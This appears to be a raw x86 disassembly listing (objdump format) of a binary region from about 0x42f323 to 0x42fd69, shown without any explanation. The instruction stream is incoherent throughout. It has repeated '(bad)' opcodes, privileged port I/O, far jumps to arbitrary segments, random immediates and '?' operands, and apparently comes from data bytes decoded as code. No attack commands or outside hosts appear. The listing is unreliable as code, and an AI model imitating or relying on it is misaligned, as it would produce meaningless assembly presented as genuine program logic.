  42f323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f324:	and    ebx,DWORD PTR [ebx-0x2756c520]
  42f32a:	jne    0x42f36b
  42f32c:	(bad)  
  42f32d:	in     eax,dx
  42f32e:	add    DWORD PTR [edi],0x6a
  42f331:	lods   al,BYTE PTR ds:[esi]
  42f332:	pop    ebx
  42f333:	pop    ebp
  42f334:	outs   dx,BYTE PTR ds:[esi]
  42f335:	aad    0x43
  42f337:	sbb    ch,BYTE PTR [eax]
  42f339:	mov    ecx,DWORD PTR [ebx]
  42f33b:	retf   0x40ec
  42f33e:	dec    edi
  42f33f:	and    BYTE PTR [edx],ch
  42f341:	add    BYTE PTR ds:[eax],al
	...
  42f3b4:	loop   0x42f373
  42f3b6:	fadd   st(7),st
  42f3b8:	(bad)  
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	adc    BYTE PTR [esi-0x2a],0x0
  42f3c4:	xchg   edx,eax
  42f3c5:	repz add DWORD PTR [eax],eax
  42f3c8:	test   BYTE PTR [eax],0x0
  42f3cb:	add    bl,dl
  42f3cd:	in     eax,dx
  42f3ce:	(bad)  
  42f3cf:	cmp    BYTE PTR [eax-0x1c4ff921],ah
  42f3d5:	jge    0x42f36f
  42f3d7:	mov    eax,cs:0xa756c267
  42f3dd:	mov    esp,0x9b2dde62
  42f3e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3e3:	dec    ebx
  42f3e4:	ss ja  0x42f3f1
  42f3e7:	sub    al,0x39
  42f3e9:	sub    BYTE PTR [ecx-0xf],bl
  42f3ec:	shr    BYTE PTR [edi-0x4ca1990d],cl
  42f3f2:	outs   dx,DWORD PTR ds:[esi]
  42f3f3:	ret    0xcef9
  42f3f6:	or     edx,DWORD PTR [ecx-0x50]
  42f3f9:	not    esi
  42f3fb:	cmp    DWORD PTR gs:0x86432783,esi
  42f402:	fiadd  DWORD PTR [eax]
  42f404:	(bad)  
  42f405:	cmp    ah,BYTE PTR [ebx]
  42f407:	mov    dh,0x6f
  42f409:	push   ecx
  42f40a:	and    eax,edi
  42f40c:	(bad)  
  42f40e:	sbb    eax,0x26bff8cd
  42f413:	or     eax,0xe179c038
  42f418:	mov    ebx,0xc39e6908
  42f41d:	jmp    0x42f422
  42f41f:	lods   eax,DWORD PTR ds:[esi]
  42f420:	push   ss
  42f421:	push   ebx
  42f422:	xchg   ebx,eax
  42f423:	jmp    0x42f40c
  42f425:	inc    esi
  42f426:	call   0x21c3:0xb6e505bf
  42f42d:	or     ebx,DWORD PTR [ebx]
  42f42f:	mov    esp,0x6df086eb
  42f434:	(bad)  
  42f435:	or     ebp,DWORD PTR es:[edi+0x74b1f442]
  42f43c:	ret    0xc064
  42f43f:	mov    WORD PTR [esp+ecx*8+0x47],ds
  42f443:	fisttp WORD PTR [ebx+esi*1]
  42f446:	mov    eax,ds:0xd8d8d66b
  42f44b:	xor    al,0xf3
  42f44d:	test   al,0x72
  42f44f:	fxch   st(6)
  42f451:	jae    0x42f4d1
  42f453:	push   ecx
  42f454:	lea    eax,[edx+eax*2-0x39]
  42f458:	sub    DWORD PTR [edx+0x67],ecx
  42f45b:	in     eax,0xf7
  42f45d:	jmp    0xcaa7:0x1e1bff54
  42f464:	mov    bh,BYTE PTR [eax-0x1c7a1ed6]
  42f46a:	(bad)  
  42f46b:	fdiv   DWORD PTR ds:0xc73e3a78
  42f471:	add    BYTE PTR [ebx-0x2dd318fa],al
  42f477:	(bad)  
  42f478:	mov    ds:0x4a1c1a7b,eax
  42f47d:	arpl   WORD PTR [edx],si
  42f47f:	nop
  42f480:	shl    BYTE PTR ds:0x745eb775,cl
  42f486:	sub    al,0xa9
  42f488:	sub    dl,BYTE PTR [eax]
  42f48a:	mov    bh,bl
  42f48c:	xchg   esi,eax
  42f48d:	mov    ds:0x44713d18,al
  42f492:	adc    edx,ecx
  42f494:	and    DWORD PTR [esi+edi*2+0x6b],esi
  42f498:	or     ah,BYTE PTR [esi]
  42f49a:	dec    edi
  42f49b:	sub    eax,0xa699de75
  42f4a0:	lock xchg ebp,eax
  42f4a2:	xor    eax,0x1075876
  42f4a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4a8:	rcl    bl,cl
  42f4aa:	xchg   DWORD PTR [ebx+0x717ae323],ebx
  42f4b0:	dec    eax
  42f4b1:	loope  0x42f524
  42f4b3:	in     eax,dx
  42f4b4:	xchg   ebx,eax
  42f4b5:	stc    
  42f4b6:	stc    
  42f4b7:	inc    edi
  42f4b8:	or     al,0xcc
  42f4ba:	mov    ah,BYTE PTR [esp+edx*8]
  42f4bd:	dec    esi
  42f4be:	xor    ebx,DWORD PTR [esi+0x56]
  42f4c1:	cmp    al,0x0
	...
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi+0x1e],bh
  42f541:	sbb    ah,BYTE PTR ss:[edx+0x1f488]
  42f548:	test   BYTE PTR [eax],0x0
  42f54b:	add    BYTE PTR [eax],ch
  42f54d:	add    eax,0xbf3f974c
  42f552:	push   cs
  42f553:	mov    WORD PTR [eax],gs
  42f555:	ret    
  42f556:	push   ebp
  42f557:	ss xchg esi,eax
  42f559:	jbe    0x42f5c8
  42f55b:	push   eax
  42f55c:	(bad)  
  42f55d:	scas   al,BYTE PTR es:[edi]
  42f55e:	out    0x4c,al
  42f560:	jmp    0xda76790f
  42f565:	retf   
  42f566:	sbb    eax,0xb62f74b8
  42f56b:	adc    al,0x97
  42f56d:	shl    DWORD PTR [ebx+0x43],0xca
  42f571:	sub    edi,DWORD PTR [edi-0x2a]
  42f574:	xchg   ebp,eax
  42f575:	jbe    0x42f561
  42f577:	ds mov cl,0x92
  42f57a:	ds xor ecx,esi
  42f57d:	cmc    
  42f57e:	dec    ebp
  42f57f:	clc    
  42f580:	xchg   esp,eax
  42f581:	adc    edi,DWORD PTR [ebx+0x778df1f2]
  42f587:	addr16 jo 0x42f50c
  42f58a:	adc    al,0x64
  42f58d:	cmp    BYTE PTR [ebp*4+0xe9eeea4],bh
  42f594:	xchg   edi,eax
  42f595:	das    
  42f596:	add    bh,BYTE PTR [ebx+0x23]
  42f599:	(bad)  
  42f59a:	pop    ebx
  42f59b:	mov    ecx,0xb8dd978d
  42f5a0:	push   0x41
  42f5a2:	add    cl,ah
  42f5a4:	pop    ds
  42f5a5:	call   ebp
  42f5a7:	int    0x64
  42f5a9:	inc    ebp
  42f5aa:	lods   eax,DWORD PTR ds:[esi]
  42f5ab:	daa    
  42f5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5ad:	mov    ah,0xa2
  42f5af:	mov    al,ds:0x1c152c38
  42f5b4:	jp     0x42f628
  42f5b6:	mov    ecx,0x9f473916
  42f5bb:	rcl    bh,cl
  42f5bd:	lock mov esp,0x8c8db1a
  42f5c3:	aad    0xe8
  42f5c5:	or     edx,DWORD PTR [esi]
  42f5c7:	xor    eax,0xfcf65771
  42f5cc:	add    eax,DWORD PTR [edi-0x73a3ef4d]
  42f5d2:	ret    0xe55
  42f5d5:	dec    ebx
  42f5d6:	dec    ebx
  42f5d7:	scas   al,BYTE PTR es:[edi]
  42f5d8:	enter  0x20ee,0xff
  42f5dc:	jns    0x42f5f5
  42f5de:	test   al,bh
  42f5e0:	dec    BYTE PTR [edi+edi*8+0x1521c01f]
  42f5e7:	add    al,0xe9
  42f5e9:	sub    ebx,DWORD PTR [esi-0x5b22acca]
  42f5ef:	loop   0x42f5db
  42f5f1:	sub    bl,cl
  42f5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5f4:	in     al,0x52
  42f5f6:	push   esi
  42f5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5f8:	xlat   BYTE PTR ds:[ebx]
  42f5f9:	out    dx,eax
  42f5fa:	inc    esp
  42f5fb:	jmp    0x1e7c:0x154e944c
  42f602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f604:	pop    ebp
  42f605:	fisub  DWORD PTR [edi]
  42f607:	adc    eax,0xa4a32f08
  42f60c:	lods   eax,DWORD PTR ds:[esi]
  42f60d:	xchg   edi,eax
  42f60e:	sub    eax,0x9181a598
  42f613:	mov    ah,BYTE PTR ds:0x94429d67
  42f619:	jg     0x42f609
  42f61b:	dec    edi
  42f61c:	daa    
  42f61d:	mov    ebp,0x3be6f726
  42f622:	and    cl,BYTE PTR [ecx-0x5fa7df1f]
  42f628:	jnp    0x42f5f8
  42f62a:	sbb    cl,BYTE PTR [ecx+0x14d12f35]
  42f630:	inc    esp
  42f631:	ins    DWORD PTR es:[edi],dx
  42f632:	jae    0x42f61e
  42f634:	in     al,0xb6
  42f636:	xchg   ebp,eax
  42f637:	popa   
  42f638:	push   es
  42f639:	cld    
  42f63a:	sub    BYTE PTR [ecx],bh
  42f63c:	arpl   WORD PTR [ecx+edx*8-0x80],si
  42f640:	push   esi
  42f641:	dec    ecx
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    dl,BYTE PTR [ebx+0x7ec6bf91]
  42f6c5:	cmc    
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	test   BYTE PTR [eax],0x0
  42f6cb:	add    BYTE PTR [ecx],ch
  42f6cd:	aaa    
  42f6ce:	(bad)
  42f6d1:	fimul  WORD PTR [eax-0x69c03947]
  42f6d7:	sbb    ebx,DWORD PTR [ebp+0x41]
  42f6da:	push   esi
  42f6db:	add    esi,0x524034d5
  42f6e1:	data16 loop 0x42f749
  42f6e4:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42f6e6:	add    cl,BYTE PTR [ebp+0x314bebe6]
  42f6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6ed:	(bad)  
  42f6ee:	icebp  
  42f6ef:	add    cl,dh
  42f6f1:	pop    ecx
  42f6f2:	aad    0x17
  42f6f4:	retf   0xa998
  42f6f7:	cli    
  42f6f8:	loop   0x42f709
  42f6fa:	ja     0x42f6bc
  42f6fc:	daa    
  42f6fd:	mov    edx,0x75c6c274
  42f702:	cmp    al,0xc5
  42f704:	mov    BYTE PTR [esi],dh
  42f706:	out    0xd5,al
  42f708:	or     BYTE PTR [ecx],0xc6
  42f70b:	int    0x71
  42f70d:	retf   
  42f70e:	adc    edi,DWORD PTR [ecx]
  42f710:	sub    al,0x75
  42f712:	jmp    0x5d597195
  42f717:	imul   edi,DWORD PTR [edi+0x11e26b2d],0x919878b0
  42f721:	push   ds
  42f722:	arpl   WORD PTR ds:0x2e60269,bx
  42f728:	test   eax,0x600253a0
  42f72d:	jb     0x42f738
  42f72f:	mov    edi,ecx
  42f731:	pop    edi
  42f732:	scas   al,BYTE PTR es:[edi]
  42f733:	fild   DWORD PTR [edx]
  42f735:	mov    esp,0xa3c4ea0c
  42f73a:	pop    ecx
  42f73b:	pop    es
  42f73c:	mov    eax,0xca4811d3
  42f741:	pop    ds
  42f742:	push   eax
  42f743:	popa   
  42f744:	sub    DWORD PTR [edx],ebx
  42f746:	leave  
  42f747:	retf   
  42f748:	(bad)
  42f74c:	xor    BYTE PTR [ebx+0x12],0x60
  42f750:	push   cs
  42f751:	sahf   
  42f752:	jmp    0x42f797
  42f754:	fst    st(6)
  42f756:	stos   BYTE PTR es:[edi],al
  42f757:	lods   eax,DWORD PTR ds:[esi]
  42f758:	sub    BYTE PTR [ebx],bl
  42f75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f75b:	cld    
  42f75c:	push   esp
  42f75d:	mov    dh,0xd5
  42f75f:	jmp    0x42f75b
  42f761:	jne    0x42f6fe
  42f763:	mov    esp,0xd1b0c857
  42f768:	bound  ebx,QWORD PTR [ebp+0x58eb8d11]
  42f76e:	and    al,0x49
  42f770:	mov    dh,0xf5
  42f772:	fild   QWORD PTR [ebx-0x2b06953]
  42f778:	cs add eax,0x5cc7dcae
  42f77e:	sahf   
  42f77f:	lods   eax,DWORD PTR ds:[esi]
  42f780:	cmp    al,dl
  42f782:	dec    edx
  42f783:	out    dx,al
  42f784:	add    ch,cl
  42f786:	out    dx,al
  42f787:	sbb    dl,BYTE PTR [ecx]
  42f789:	das    
  42f78a:	shl    BYTE PTR [edx+0x41cf5165],1
  42f790:	mov    eax,0x4e2887dc
  42f795:	fisub  DWORD PTR [eax+ebp*2-0x1be05aad]
  42f79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f79d:	cwde   
  42f79e:	(bad)  
  42f79f:	(bad)  
  42f7a0:	pop    ss
  42f7a1:	jp     0x42f761
  42f7a3:	mov    bh,0x51
  42f7a5:	ret    
  42f7a6:	leave  
  42f7a7:	push   0xffffffb5
  42f7a9:	inc    ebp
  42f7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f7ab:	pop    esp
  42f7ac:	xchg   edx,eax
  42f7ad:	xor    al,0x50
  42f7af:	push   ss
  42f7b0:	js     0x42f82a
  42f7b2:	test   eax,0xe8c94da4
  42f7b7:	and    al,0xba
  42f7b9:	in     al,0xbb
  42f7bb:	jnp    0x42f778
  42f7bd:	ror    BYTE PTR [ebx+0x86acf0],cl
	...
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi+0x2a50c88f]
  42f841:	mov    dl,0xad
  42f843:	mov    bh,0x74
  42f845:	test   BYTE PTR [ecx],0x0
  42f848:	test   BYTE PTR [eax],0x0
  42f84b:	add    bl,bl
  42f84d:	sub    DWORD PTR [esp+ebp*2-0x1b],0xebf703d6
  42f855:	inc    esi
  42f856:	mov    ds:0x34c5a6f3,al
  42f85b:	(bad)  
  42f85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f85d:	mov    bl,0xd2
  42f85f:	inc    esi
  42f860:	push   edi
  42f861:	dec    ebx
  42f862:	fadd   QWORD PTR [ebx-0x19]
  42f865:	jnp    0x42f833
  42f867:	mov    bl,0x1c
  42f869:	mov    esi,0x9f5c2a3d
  42f86e:	adc    DWORD PTR [edi-0x57],eax
  42f871:	mov    dh,0x9d
  42f873:	bnd jbe 0x42f8b6
  42f876:	neg    esi
  42f878:	inc    ebp
  42f879:	adc    DWORD PTR ds:0x2beef55b,edx
  42f87f:	aaa    
  42f880:	push   eax
  42f881:	outs   dx,BYTE PTR ds:[esi]
  42f882:	mov    ds:0x58f8a321,eax
  42f887:	xor    al,0x3e
  42f889:	mov    esi,0xc5273c05
  42f88e:	inc    ebp
  42f88f:	rol    DWORD PTR [esi],cl
  42f891:	add    al,0xbc
  42f893:	in     eax,0x26
  42f895:	add    cl,BYTE PTR [ebp+0x73]
  42f898:	test   BYTE PTR [esi+0x3c],0xab
  42f89c:	ins    BYTE PTR es:[edi],dx
  42f89d:	sub    BYTE PTR [eax+ebp*4-0x1c],cl
  42f8a1:	in     eax,0x7e
  42f8a3:	inc    ecx
  42f8a4:	nop
  42f8a5:	std    
  42f8a6:	mov    ecx,0xb3b54454
  42f8ab:	mov    dl,0x47
  42f8ad:	retf   
  42f8ae:	mov    esi,0xfd798d78
  42f8b3:	lock xchg ecx,eax
  42f8b5:	test   DWORD PTR [ecx-0x2c],ebx
  42f8b8:	pop    edx
  42f8b9:	lock aaa 
  42f8bb:	adc    eax,0x56ff4233
  42f8c0:	mov    esi,0xe262ede7
  42f8c5:	jns    0x42f90b
  42f8c7:	push   ebp
  42f8c8:	sbb    BYTE PTR [edx+0x12],dh
  42f8cb:	pusha  
  42f8cc:	loopne 0x42f87a
  42f8ce:	dec    eax
  42f8cf:	inc    ecx
  42f8d0:	pop    ss
  42f8d1:	jne    0x42f8cd
  42f8d3:	push   edi
  42f8d4:	ins    DWORD PTR es:[edi],dx
  42f8d5:	add    bl,BYTE PTR [edx+0x32]
  42f8d8:	clc    
  42f8d9:	and    ch,BYTE PTR ss:[ebp+0x77dd7d9d]
  42f8e0:	mov    esi,DWORD PTR [ecx]
  42f8e2:	mov    WORD PTR [ecx+0x37],ds
  42f8e5:	leave  
  42f8e6:	setb   BYTE PTR [ebx+eiz*8-0x177a8428]
  42f8ee:	lods   al,BYTE PTR ds:[esi]
  42f8ef:	mov    esp,0x930abfe9
  42f8f4:	imul   eax,ebx,0xd00c4d5e
  42f8fa:	fistp  QWORD PTR [eax+0x19d25e46]
  42f900:	cwde   
  42f901:	dec    esi
  42f902:	adc    eax,0x860a68ac
  42f907:	sbb    BYTE PTR [eax+ebp*2+0x4c7c3f19],dl
  42f90e:	loope  0x42f8bc
  42f910:	sbb    cl,dh
  42f912:	inc    esp
  42f913:	adc    al,0xbe
  42f915:	cli    
  42f916:	mov    bl,0x70
  42f918:	push   esi
  42f919:	leave  
  42f91a:	mov    ebp,0x9a83dc63
  42f91f:	ret    
  42f920:	daa    
  42f921:	jmp    0x4da6:0xbffc92c9
  42f928:	out    dx,al
  42f929:	pop    edx
  42f92a:	arpl   ax,si
  42f92c:	mov    al,0xc
  42f92e:	and    DWORD PTR [eax+0x1f42c33],edx
  42f934:	adc    al,0x7d
  42f936:	fisub  DWORD PTR cs:[ebp-0x30]
  42f93a:	outs   dx,DWORD PTR ds:[esi]
  42f93b:	daa    
  42f93c:	add    BYTE PTR [eax+edi*2],cl
  42f93f:	out    dx,al
  42f940:	pop    edi
  42f941:	pop    esi
	...
  42f9b2:	add    BYTE PTR [eax],al
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	add    al,0xd7
  42f9c2:	xchg   ebx,eax
  42f9c3:	cmp    BYTE PTR [edx-0x9],ch
  42f9c6:	add    DWORD PTR [eax],eax
  42f9c8:	test   BYTE PTR [eax],0x0
  42f9cb:	add    ch,al
  42f9cd:	pop    ebp
  42f9ce:	adc    eax,DWORD PTR [ebp+0x24]
  42f9d1:	pop    esp
  42f9d2:	cwde   
  42f9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9d4:	adc    DWORD PTR [edi+0x74fd951c],ebp
  42f9da:	push   edi
  42f9db:	push   ebx
  42f9dc:	push   ecx
  42f9dd:	nop
  42f9de:	not    ah
  42f9e0:	mov    ds:0xfd19da93,al
  42f9e5:	out    0x41,eax
  42f9e7:	daa    
  42f9e8:	mov    BYTE PTR [ebx-0x83d7bac],0x5d
  42f9ef:	dec    ebp
  42f9f0:	test   al,0x7b
  42f9f2:	push   esp
  42f9f3:	pop    esi
  42f9f4:	rcr    DWORD PTR [esi-0x2a],1
  42f9f7:	xor    ebp,DWORD PTR [ebx]
  42f9f9:	repnz and BYTE PTR [di-0xcdd],bl
  42f9ff:	mov    edx,0xfbef34d6
  42fa04:	in     al,dx
  42fa05:	lods   eax,DWORD PTR ds:[esi]
  42fa06:	or     eax,0x3c4971a0
  42fa0b:	fidivr DWORD PTR [ecx+0xc]
  42fa0e:	jb     0x42fa48
  42fa10:	nop
  42fa11:	mov    DWORD PTR [edi-0x5336f5ba],ecx
  42fa17:	cmc    
  42fa18:	(bad)  
  42fa19:	cli    
  42fa1a:	push   0xffffffef
  42fa1c:	xchg   ebp,eax
  42fa1d:	mov    bl,0xa4
  42fa1f:	in     eax,0x64
  42fa21:	stos   BYTE PTR es:[edi],al
  42fa22:	and    DWORD PTR [edx+0x5b],eax
  42fa25:	jne    0x42fa15
  42fa27:	es jmp 0x35054266
  42fa2d:	sahf   
  42fa2e:	jbe    0x42faa7
  42fa30:	mov    dl,0xdd
  42fa32:	push   ds
  42fa33:	and    bl,cl
  42fa35:	repz bound edx,QWORD PTR [ebp+0xddf52d1]
  42fa3c:	(bad)  
  42fa3d:	leave  
  42fa3e:	adc    BYTE PTR [esi+esi*2+0x6c],bl
  42fa42:	mov    ds:0xe0b20671,eax
  42fa47:	push   0x39347a01
  42fa4c:	in     al,dx
  42fa4d:	and    esi,DWORD PTR [ebx-0xdc4e0b9]
  42fa53:	(bad)  
  42fa54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa55:	out    dx,al
  42fa56:	adc    BYTE PTR [ecx+edi*1+0x2d],bh
  42fa5a:	ins    BYTE PTR es:[edi],dx
  42fa5b:	dec    ebx
  42fa5c:	jnp    0x42fa26
  42fa5e:	mov    ah,0x65
  42fa60:	and    edi,DWORD PTR [ebx+0x2b]
  42fa63:	adc    al,0x25
  42fa65:	adc    BYTE PTR [eax+0x58c431b6],dh
  42fa6b:	xchg   BYTE PTR [edx],ch
  42fa6d:	add    ebp,edi
  42fa6f:	mov    eax,0x5f56bf33
  42fa74:	out    dx,eax
  42fa75:	and    BYTE PTR [edx+0x2c],0x37
  42fa79:	call   DWORD PTR [edx]
  42fa7b:	cdq    
  42fa7c:	cmp    al,0xb1
  42fa7e:	jmp    0x42fad7
  42fa80:	aam    0xb
  42fa82:	and    al,0x1b
  42fa84:	fwait
  42fa85:	loopne 0x42faa1
  42fa87:	mov    al,ds:0xf6c1427e
  42fa8c:	mov    esi,0x8b28063c
  42fa91:	ins    DWORD PTR es:[edi],dx
  42fa92:	mov    eax,DWORD PTR [esi+esi*2]
  42fa95:	outs   dx,DWORD PTR ds:[esi]
  42fa96:	mov    edi,0xec4bbe74
  42fa9b:	ins    BYTE PTR es:[edi],dx
  42fa9c:	inc    esp
  42fa9d:	rdtsc  
  42fa9f:	sbb    BYTE PTR [ecx-0x4838fecf],ah
  42faa5:	jns    0x42fb0b
  42faa7:	or     DWORD PTR [eax],0x4bcade72
  42faad:	cld    
  42faae:	inc    ebx
  42faaf:	cmp    dh,bh
  42fab1:	pop    eax
  42fab2:	adc    DWORD PTR [esp+eax*1],ebp
  42fab5:	mov    al,0xa5
  42fab7:	sbb    esi,DWORD PTR [ebx-0x17]
  42faba:	pop    ss
  42fabb:	jnp    0x42fab3
  42fabd:	sbb    ah,BYTE PTR [ebp+0x5d]
  42fac0:	lods   al,BYTE PTR ds:[esi]
  42fac1:	clc    
	...
  42fb32:	add    BYTE PTR [eax],al
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	inc    ebx
  42fb41:	inc    ecx
  42fb42:	cmp    BYTE PTR [ebx],al
  42fb44:	pusha  
  42fb45:	clc    
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	test   BYTE PTR [eax],0x0
  42fb4b:	add    BYTE PTR [ebp+0x358730de],ah
  42fb51:	sub    ch,dh
  42fb53:	mov    ds:0x6b1e4fae,al
  42fb58:	aaa    
  42fb59:	mov    esi,0xccccf126
  42fb5e:	jp     0x42faf2
  42fb60:	je     0x42fae6
  42fb62:	push   ebp
  42fb63:	pop    ecx
  42fb64:	jp     0x42fbb7
  42fb66:	dec    edx
  42fb67:	add    ah,BYTE PTR [esi-0x14]
  42fb6a:	cwde   
  42fb6b:	hlt    
  42fb6c:	and    esp,ecx
  42fb6e:	in     al,0xde
  42fb70:	jmp    0xac85bf4d
  42fb75:	sub    BYTE PTR [ecx+0x52],cl
  42fb78:	mov    ecx,0x861db8d4
  42fb7d:	cmp    BYTE PTR [eax+0x18],0x6
  42fb81:	cli    
  42fb82:	xchg   ecx,eax
  42fb83:	mov    edx,0xb7aede89
  42fb88:	dec    ebp
  42fb89:	sub    esp,DWORD PTR [edx]
  42fb8b:	pushf  
  42fb8c:	nop
  42fb8d:	and    BYTE PTR [esi+0x4423b22b],0xf7
  42fb94:	(bad)  
  42fb95:	fs test al,0x33
  42fb98:	sub    al,0x75
  42fb9a:	and    DWORD PTR [ebp+ecx*4-0x5b],ebp
  42fb9e:	sar    DWORD PTR [edx-0x48eeb21b],1
  42fba4:	rol    DWORD PTR [ebp-0x45],1
  42fba7:	mov    bh,0x50
  42fba9:	cmp    al,0x16
  42fbab:	and    BYTE PTR [edi],al
  42fbad:	int    0xf1
  42fbaf:	sbb    ecx,edi
  42fbb1:	ins    BYTE PTR es:[edi],dx
  42fbb2:	jne    0x42fbc6
  42fbb4:	sbb    al,0x9d
  42fbb6:	adc    ebx,DWORD PTR [ecx]
  42fbb8:	push   esi
  42fbb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbba:	or     al,0xd0
  42fbbc:	or     eax,0x5c722926
  42fbc1:	(bad)  
  42fbc2:	pushf  
  42fbc3:	cmp    DWORD PTR [edx+0x53],ebp
  42fbc6:	fst    DWORD PTR [edi+0x66]
  42fbc9:	inc    ebp
  42fbca:	test   dl,0x74
  42fbcd:	fist   WORD PTR [edx-0x4e332945]
  42fbd3:	cmp    al,0xc3
  42fbd5:	add    dh,dl
  42fbd7:	sbb    DWORD PTR [edx-0x10],esp
  42fbda:	push   ss
  42fbdb:	xor    al,0xad
  42fbdd:	je     0x42fbf6
  42fbdf:	call   0xd42afc77
  42fbe4:	retf   
  42fbe5:	cdq    
  42fbe6:	mov    eax,0x835af2a1
  42fbeb:	mov    ecx,0xf0401f1f
  42fbf0:	cmp    al,0x7
  42fbf2:	aaa    
  42fbf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbf4:	(bad)  
  42fbf5:	in     eax,dx
  42fbf6:	fcomp  DWORD PTR [edi+esi*2]
  42fbf9:	hlt    
  42fbfa:	push   eax
  42fbfb:	and    BYTE PTR [esi-0x6ba78087],al
  42fc01:	repnz inc esi
  42fc03:	add    DWORD PTR [edx],ebp
  42fc05:	bswap  ebx
  42fc07:	into   
  42fc08:	mov    al,ds:0xe0d75d7b
  42fc0d:	xlat   BYTE PTR ds:[ebx]
  42fc0e:	in     al,dx
  42fc0f:	test   DWORD PTR [bx],ecx
  42fc12:	pop    edi
  42fc13:	jmp    0x42fc0e
  42fc15:	mov    eax,ds:0xf0f2b430
  42fc1a:	xor    ah,ch
  42fc1c:	aas    
  42fc1d:	mov    ch,BYTE PTR [esi+0x6ad15694]
  42fc23:	mov    dl,0xef
  42fc25:	cmp    edx,DWORD PTR [eax+ecx*1-0x7c250689]
  42fc2c:	test   al,0x8e
  42fc2e:	nop
  42fc2f:	or     DWORD PTR [ebp-0x47],0xffffffb0
  42fc33:	inc    esp
  42fc34:	icebp  
  42fc35:	mov    WORD PTR [edx],?
  42fc37:	call   0x2ba:0xda0254c3
  42fc3e:	mov    ax,ds:0x1bfe
	...
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0xa5be28b9
  42fcc3:	and    BYTE PTR [esi-0x7],dl
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	test   BYTE PTR [eax],0x0
  42fccb:	add    bl,bh
  42fccd:	retf   0x8130
  42fcd0:	mov    es,WORD PTR [eax]
  42fcd2:	cmp    DWORD PTR [ebx+0x24949dcc],0xb6245ecc
  42fcdc:	icebp  
  42fcdd:	int    0x0
  42fcdf:	scas   al,BYTE PTR es:[edi]
  42fce0:	xor    eax,0xaa547af1
  42fce5:	(bad)  [ecx]
  42fce7:	clc    
  42fce8:	inc    eax
  42fce9:	cld    
  42fcea:	xchg   BYTE PTR [eax+eiz*8+0x286cfeaf],ah
  42fcf1:	xchg   BYTE PTR [eax+0x2c],bl
  42fcf4:	(bad)  
  42fcf5:	xor    eax,0xcd2d824a
  42fcfa:	mov    al,ds:0x90c85e63
  42fcff:	mov    bh,BYTE PTR [edx+0x52]
  42fd02:	xor    eax,0x67dbb7da
  42fd07:	mov    ch,0x13
  42fd09:	xor    edx,DWORD PTR ds:0xbb28728b
  42fd0f:	je     0x42fd54
  42fd11:	in     al,0x51
  42fd13:	mov    ?,WORD PTR [edi+0x32]
  42fd16:	out    dx,al
  42fd17:	mov    al,0x5b
  42fd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd1a:	add    BYTE PTR [edi],bl
  42fd1c:	add    ebx,DWORD PTR [esi+ebx*1-0x2a]
  42fd20:	(bad)  
  42fd21:	jle    0x42fd98
  42fd23:	xchg   ebp,eax
  42fd24:	ja     0x42fd5f
  42fd26:	je     0x42fd58
  42fd28:	fsub   st(1),st
  42fd2a:	jno    0x42fd21
  42fd2c:	int3   
  42fd2d:	adc    eax,0xcc85918d
  42fd32:	fs inc esi
  42fd34:	jo     0x42fcd9
  42fd36:	rcl    BYTE PTR [ebx+eax*1-0x1],0x4f
  42fd3b:	adc    al,0xc7
  42fd3d:	inc    esi
  42fd3e:	adc    esi,DWORD PTR [edx+edx*2]
  42fd41:	or     eax,0xbf05bfba
  42fd46:	icebp  
  42fd47:	mov    edx,0xf192335f
  42fd4c:	or     ah,dh
  42fd4e:	bnd ret 
  42fd50:	push   fs
  42fd52:	sbb    ecx,DWORD PTR ds:0xaf88331
  42fd58:	push   cs
  42fd59:	cmp    al,0x9d
  42fd5b:	popa   
  42fd5c:	repnz inc ecx
  42fd5e:	pop    ss
  42fd5f:	fnstcw WORD PTR [esp+ebp*4+0x14b7d938]
  42fd66:	jae    0x42fd3d
  42fd68:	push   edx
  42fd69:	(bad)  
